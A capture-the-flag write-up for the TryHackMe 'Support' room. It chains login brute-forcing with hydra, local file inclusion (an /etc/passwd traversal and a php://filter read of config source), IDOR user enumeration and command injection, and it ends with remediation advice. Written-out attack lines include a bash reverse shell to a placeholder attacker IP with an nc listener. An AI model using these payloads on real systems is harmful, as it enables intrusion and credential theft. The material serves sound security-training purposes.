# TryHackMe — Support | Penetration Testing Writeup

**Author:** OD1Nn00b
**Platform:** TryHackMe
**Room:** Support
**Difficulty:** Medium
**Category:** Web Exploitation / IDOR / LFI / Command Injection

---

## Disclaimer

This writeup documents a penetration test performed against a machine hosted on TryHackMe, a legal and authorized platform designed for practicing offensive security skills. All actions described were performed in an isolated lab environment with explicit permission. None of these techniques should be used against systems you do not own or have written authorization to test.

---

## Executive Summary

The `Support` machine simulates a customer support ticketing platform. The attack chain progressed through four stages:

1. **Credential access** — a brute-force attack against an exposed login form.
2. **Local File Inclusion (LFI)** — used to read sensitive server-side PHP source files and extract a master password stored in a configuration file.
3. **IDOR (Insecure Direct Object Reference)** — abused in an internal user API to enumerate the administrator's email address.
4. **Command Injection → RCE** — a date/time processing feature on the admin dashboard failed to sanitize input, allowing arbitrary command execution and full compromise of the host.

---

## 1. Reconnaissance

### 1.1 Nmap Scan

Start with a full TCP port scan to identify exposed services:

```bash
nmap -sC -sV -p- -oN nmap-initial.txt <TARGET_IP>
```

*Paste your actual scan output here. Typically for this room you'll find:*
- **Port 22** – SSH
- **Port 80** – HTTP (web application)

### 1.2 Web Enumeration

With HTTP identified, enumerate the site structure and technology stack:

```bash
whatweb http://<TARGET_IP>
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php
```

Note the login portal, any visible usernames, and application framework (e.g., PHP-based custom app).

---

## 2. Initial Access — Brute Force

The login page did not implement rate-limiting or account lockout, making it vulnerable to a brute-force attack.

```bash
hydra -l <username> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form \
"/login:username=^USER^&password=^PASS^:Invalid credentials"
```

**Result:** Valid low-privilege credentials obtained for a support-level account.

> 🔑 Tip: Adjust the failure string to match the exact error message returned by the app, and confirm the request method (GET/POST) and parameter names via Burp Suite before brute-forcing.

---

## 3. Local File Inclusion (LFI)

After authenticating, a parameter in the application (commonly used to load a "page" or "template") was found to be vulnerable to path traversal / LFI.

```
http://<TARGET_IP>/index.php?page=../../../../etc/passwd
```

Once traversal was confirmed, the same technique was used to pull PHP application source files using a **PHP filter wrapper**, since directly including `.php` files executes them rather than displaying their source:

```
http://<TARGET_IP>/index.php?page=php://filter/convert.base64-encode/resource=config
```

Decode the returned Base64 blob:

```bash
echo "<base64_output>" | base64 -d
```

**Result:** The decoded configuration file revealed a **master password** used across the application's backend.

---

## 4. Privilege Path — IDOR on the User API

The application exposed an internal REST-style endpoint for user objects, referenced by a predictable numeric ID:

```
http://<TARGET_IP>/api/users/1
http://<TARGET_IP>/api/users/2
...
```

By incrementing the ID (an IDOR vulnerability — no authorization check tied the requester to the resource), it was possible to enumerate other accounts and retrieve the **administrator's email address**.

```bash
for i in $(seq 1 20); do curl -s http://<TARGET_IP>/api/users/$i; done
```

---

## 5. Credential Correlation & Admin Login

The master password recovered via LFI was not used verbatim — it required light mutation (a common CTF pattern, e.g. appending a year, capitalizing a letter, or a known transformation hinted at elsewhere in the app) to match the admin account's actual password.

Tools like **CUPP** or a small custom mutation script/wordlist help automate this:

```bash
cupp -i
hydra -l <admin_email> -P mutated_wordlist.txt <TARGET_IP> http-post-form \
"/login:username=^USER^&password=^PASS^:Invalid credentials"
```

**Result:** Successful authentication to the **administrator dashboard**.

---

## 6. Remote Code Execution — Command Injection

The admin panel included a **date/time configuration feature** that passed user input directly into a shell command on the backend (e.g., to sync server time or generate a report timestamp) without sanitization.

Testing with basic injection operators confirmed the vulnerability:

```
2024-01-01; id
2024-01-01 && whoami
```

Once confirmed, a reverse shell payload was injected:

```bash
2024-01-01; bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
```

Start a listener beforehand:

```bash
nc -lvnp 4444
```

**Result:** Reverse shell obtained as the web service user.

---

## 7. Post-Exploitation & Flag Capture

```bash
find / -iname "*flag*.txt" 2>/dev/null
cat /path/to/flag.txt
```

If privilege escalation is required for the root flag, check standard vectors:

```bash
sudo -l
find / -perm -4000 2>/dev/null
```

---

## 8. Root Cause & Remediation

| Vulnerability | Root Cause | Fix |
|---|---|---|
| Brute-force login | No rate-limiting / lockout | Implement account lockout, CAPTCHA, MFA |
| LFI | Unsanitized `page` parameter | Whitelist allowed file names; avoid dynamic includes |
| IDOR | Missing object-level authorization | Enforce access control checks per resource ID |
| Command Injection | Shell command built from raw user input | Use safe APIs (e.g., parameterized calls), input validation, avoid shell invocation entirely |

---

## 9. Lessons Learned

- Never trust user-controlled input in file paths or shell commands.
- Predictable, sequential resource IDs are a classic IDOR indicator — always test authorization, not just authentication.
- Sensitive credentials (master passwords, API keys) should never live in web-accessible config files without additional protection (env vars, secrets managers).
- Defense in depth matters: any single control failing here (rate-limiting, input sanitization, or access control) would have broken the chain.

---

*Writeup structure and steps written independently based on personal completion of the room; screenshots and exact outputs should be added from your own attempt before publishing.*
